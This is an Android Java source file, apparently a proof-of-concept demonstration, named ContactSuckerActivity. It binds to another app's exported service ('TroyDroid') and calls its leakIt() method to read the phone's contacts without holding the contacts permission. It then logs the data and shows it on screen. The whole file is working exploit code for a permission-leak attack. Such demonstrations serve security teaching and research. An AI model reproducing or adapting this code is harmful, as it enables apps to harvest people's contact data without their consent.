package de.macmark.client;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.TextView;
import de.macmark.server.ITroyService;

//Reading contacts data without permission. Uses inter app service TroyDroid.
//For more informations take a look at http://www.macmark.de/android.php#example_exploit3

public class ContactSuckerActivity extends Activity {

	TextView tv;
	ITroyService mRemoteService;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

//		Intent serviceIntent=new Intent(this,de.macmark.server.ITroyService.class);
		Intent serviceIntent=new Intent();
		serviceIntent.setClassName("de.macmark.server", "de.macmark.server.TroyImpl");
		boolean ok=getApplicationContext().bindService(serviceIntent, mServiceConnection,Context.BIND_AUTO_CREATE);
		Log.e("====> ok", String.valueOf(ok));
		
		tv = new TextView(this);
		tv.setMovementMethod(new ScrollingMovementMethod());
		setContentView(tv);

	}

	private ServiceConnection mServiceConnection=new ServiceConnection() {

		public void onServiceDisconnected(ComponentName name) {
			// TODO Auto-generated method stub

		}

		public void onServiceConnected(ComponentName name, IBinder service) {
			// get instance of the aidl binder
			mRemoteService = ITroyService.Stub.asInterface(service);
			try {
				String message=mRemoteService.leakIt();
				Log.e("message", message);
				tv.append(message);
			} catch (RemoteException e) {
				Log.e("RemoteException", e.toString());
			}

		}
	};
}
